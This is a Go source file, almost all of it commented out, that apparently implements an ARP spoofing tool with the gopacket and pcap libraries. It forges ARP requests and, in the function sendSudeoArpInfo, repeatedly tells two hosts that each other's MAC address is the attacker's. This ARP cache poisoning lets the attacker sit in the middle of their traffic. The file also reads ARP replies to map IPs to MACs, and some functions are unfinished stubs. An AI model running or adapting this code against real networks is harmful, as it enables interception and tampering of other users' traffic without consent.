package main
//
//import (
//	"bytes"
//	"fmt"
//	"github.com/google/gopacket"
//	"github.com/google/gopacket/layers"
//	"github.com/google/gopacket/pcap"
//	"log"
//	"net"
//	"os"
//	"sync"
//	"time"
//)
//
//var handleMutex sync.Mutex = sync.Mutex{}
//
//const device = "Realtek PCIe GbE Family Controller"
//
//func main() {
//
//}
//
//func SendAFakeArpRequest(handle *pcap.Handle, dstIP, srcIP net.IP, dstMac, srcMac net.HardwareAddr) {
//
//	//arp 报文结构
//	arpLayer := &layers.ARP{
//		AddrType:          layers.LinkTypeEthernet,
//		Protocol:          layers.EthernetTypeIPv4,
//		HwAddressSize:     6,
//		ProtAddressSize:   4,
//		Operation:         layers.ARPRequest,
//		DstHwAddress:      dstMac,
//		DstProtAddress:    []byte(dstIP.To4()),
//		SourceHwAddress:   srcMac,
//		SourceProtAddress: []byte(srcIP.To4()),
//	}
//
//	//以太网首部结构
//	ethernetLayer := &layers.Ethernet{
//		SrcMAC:       srcMac,
//		DstMAC:       dstMac,
//		EthernetType: layers.EthernetTypeARP,
//	}
//
//	// And create the packet with the layers
//	buffer := gopacket.NewSerializeBuffer()
//	opts := gopacket.SerializeOptions{
//		FixLengths:       true,
//		ComputeChecksums: true,
//	}
//	err := gopacket.SerializeLayers(buffer, opts,
//		ethernetLayer,
//		arpLayer,
//	)
//	if err != nil {
//		fmt.Println(err)
//	}
//	outgoingPacket := buffer.Bytes()
//	fmt.Println("sending arp")
//	//log.Debug(hex.Dump(outgoingPacket))
//	func() {
//		handleMutex.Lock()
//		defer handleMutex.Unlock()
//		err = handle.WritePacketData(outgoingPacket)
//		if err != nil {
//			fmt.Println(err)
//		}
//	}()
//}
//
//func modifyMac() {
//
//	handle, err := pcap.OpenLive("Realtek PCIe GbE Family Controller", 65535, false, pcap.BlockForever)
//	if err != nil {
//		fmt.Println(err)
//		return
//	}
//	defer handle.Close()
//	_ = handle.SetDirection(pcap.DirectionOut)
//	destIp := "192.168.131.125"
//	destMap := "08:00:27:0c:20:93"
//
//}
//
//func getMacFromIp(ip net.IP) {
//	handle, err := pcap.OpenLive(device, 65535, false, pcap.BlockForever)
//	if err != nil {
//		fmt.Println(err)
//	}
//	defer handle.Close()
//	macs := make(map[string]net.HardwareAddr)
//
//	//开一个协程读取arp回复
//	go readARP(handle, nil, macs)
//
//
//
//}
//
//// readARP loops until 'stop' is closed.
//func readARP(handle *pcap.Handle, localMac net.HardwareAddr, macs map[string]net.HardwareAddr) {
//	src := gopacket.NewPacketSource(handle, layers.LayerTypeEthernet)
//	for packet := range src.Packets() {
//		arpLayer := packet.Layer(layers.LayerTypeARP)
//		if arpLayer == nil {
//			continue
//		}
//		arp := arpLayer.(*layers.ARP)
//		if arp.Operation != layers.ARPReply || bytes.Equal([]byte(localMac), arp.SourceHwAddress) {
//			// This is a packet I sent.
//			continue
//		}
//		// Note:  we might get some packets here that aren't responses to ones we've sent,
//		// if for example someone else sends US an ARP request.  Doesn't much matter, though...
//		// all information is good information :)
//		fmt.Printf("IP %v is at %v", net.IP(arp.SourceProtAddress), net.HardwareAddr(arp.SourceHwAddress))
//		macs[net.IP(arp.SourceProtAddress).To4().String()] = arp.SourceHwAddress
//	}
//}
//
////tell ip1 that ip2's mac is mymac and tell ip2 that ip1's mac is mymac periodly
//func sendSudeoArpInfo(interfaceName string, myip, ip1, ip2 net.IP, mymac, mac1, mac2 net.HardwareAddr, shouldStop *bool) {
//	fmt.Printf("start sending fake arp packets...\n")
//	handle, err := pcap.OpenLive(interfaceName, 65535, false, pcap.BlockForever)
//	if err != nil {
//		fmt.Println(err)
//		return
//	}
//	defer handle.Close()
//	_ = handle.SetDirection(pcap.DirectionOut)
//	for !(*shouldStop) {
//		//tell ip1 that ip2's mac is mymac
//		SendAFakeArpRequest(handle, ip1, ip2, mac1, mymac)
//		//tell ip2 that ip1's mac is mymac
//		SendAFakeArpRequest(handle, ip2, ip1, mac2, mymac)
//		time.Sleep(1 * time.Second)
//	}
//
//}
